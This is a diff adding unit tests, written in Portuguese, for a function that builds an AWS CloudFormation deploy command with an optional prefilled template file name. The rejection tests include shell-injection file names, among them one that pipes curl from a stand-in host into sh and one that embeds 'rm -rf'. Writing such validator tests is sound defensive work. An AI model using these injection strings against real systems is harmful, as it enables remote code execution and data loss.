@@ -13,6 +13,7 @@ import {
   AWS_READER_CAPABILITY_PARAMETERS,
   AWS_READER_PREFILLED_PARAMETERS,
   AWS_READER_ROLE_TAGS,
+  AWS_READER_TEMPLATE_FILE,
   AWS_READER_TEMPLATE_VERSION,
   type AwsReaderCapability,
   AwsReaderPrefillError,
@@ -259,6 +260,86 @@ describe('papel de leitura sem chave (PR-V3)', () => {
       }),
     ).toContain(`NodeEgressIps=${NODE_EGRESS_IPS_PLACEHOLDER} \\`);
   });
+
+  it('o comando lê o arquivo que o painel baixa: o preenchido, quando é ele, com os parâmetros ainda no comando', () => {
+    const values = {
+      nodeServiceAccountId: SERVICE_ACCOUNT,
+      egressIps: ['203.0.113.10/32'],
+      audience: AWS_READER_AUDIENCE,
+      buckets: ['trilha-111122223333'],
+      capabilities: ['discovery', 'findings'],
+    } as const;
+    const plain = awsReaderDeployCommand(values);
+    const fileOf = (command: string) => command.split(' --template-file ')[1]?.split(' ')[0];
+    // Sem a opção (o console da Verax e a alternativa manual), o arquivo do repositório.
+    expect(fileOf(plain)).toBe(AWS_READER_TEMPLATE_FILE);
+    expect(awsReaderDeployCommand(values, {})).toBe(plain);
+    expect(awsReaderDeployCommand(values, { templateFile: undefined })).toBe(plain);
+    expect(awsReaderDeployCommand(values, { templateFile: AWS_READER_TEMPLATE_FILE })).toBe(plain);
+
+    // Com o nome do arquivo preenchido, só o nome do arquivo muda: os parâmetros continuam explícitos, porque numa
+    // atualização a AWS manteria os valores anteriores da pilha (os padrões do arquivo só valem numa pilha nova).
+    const prefilled = awsReaderDeployCommand(values, { templateFile: awsReaderPrefilledFileName(ACCOUNT) });
+    expect(fileOf(prefilled)).toBe('verax-control-reader-111122223333.yaml');
+    expect(prefilled).toBe(
+      plain.replace(
+        '--template-file verax-control-reader.yaml ',
+        '--template-file verax-control-reader-111122223333.yaml ',
+      ),
+    );
+    for (const parameter of [
+      'NodeServiceAccountId=123456789012345678901',
+      'NodeEgressIps=203.0.113.10/32',
+      `Audience=${AWS_READER_AUDIENCE}`,
+      'ReadAwsServiceLogs=false',
+      'ReadSecurityFindings=true',
+      'ReadTaggedLogGroups=false',
+      'LogBucketArns=arn:aws:s3:::trilha-111122223333',
+    ]) {
+      expect(prefilled).toContain(`    ${parameter}`);
+    }
+  });
+
+  it.each([
+    '',
+    '.yaml',
+    'verax-control-reader.yml',
+    'verax-control-reader.yaml.sh',
+    'Verax-Control-Reader.yaml',
+    'verax control reader.yaml',
+    '-o.yaml',
+    '--template-url.yaml',
+    '.oculto.yaml',
+    '../verax-control-reader.yaml',
+    'pasta/verax-control-reader.yaml',
+    'pasta\\verax-control-reader.yaml',
+    'a..b.yaml',
+    'verax_control_reader.yaml',
+    "x'; curl exemplo.invalid | sh #.yaml",
+    'x$(id).yaml',
+    'x`id`.yaml',
+    'x\nrm -rf.yaml',
+    `${'a'.repeat(60)}.yaml`,
+  ])('nome de arquivo fora do formato não entra no comando: %j', (templateFile) => {
+    const values = {
+      nodeServiceAccountId: SERVICE_ACCOUNT,
+      egressIps: ['203.0.113.10/32'],
+      audience: AWS_READER_AUDIENCE,
+      buckets: [],
+    };
+    expect(awsReaderDeployCommand(values, { templateFile })).toBe(awsReaderDeployCommand(values));
+  });
+
+  it.each(['modelo.yaml', 'verax-control-reader-000000000000.yaml', '1.yaml', `${'a'.repeat(59)}.yaml`])(
+    'nome de arquivo aceito no comando: %s',
+    (templateFile) => {
+      const command = awsReaderDeployCommand(
+        { nodeServiceAccountId: SERVICE_ACCOUNT, egressIps: [], audience: AWS_READER_AUDIENCE, buckets: [] },
+        { templateFile },
+      );
+      expect(command).toContain(`  --template-file ${templateFile} --capabilities CAPABILITY_NAMED_IAM \\`);
+    },
+  );
 
   it('o console do CloudFormation abre na região da conta (ou em sa-east-1)', () => {
     expect(cloudFormationConsoleUrl('us-east-1')).toBe(
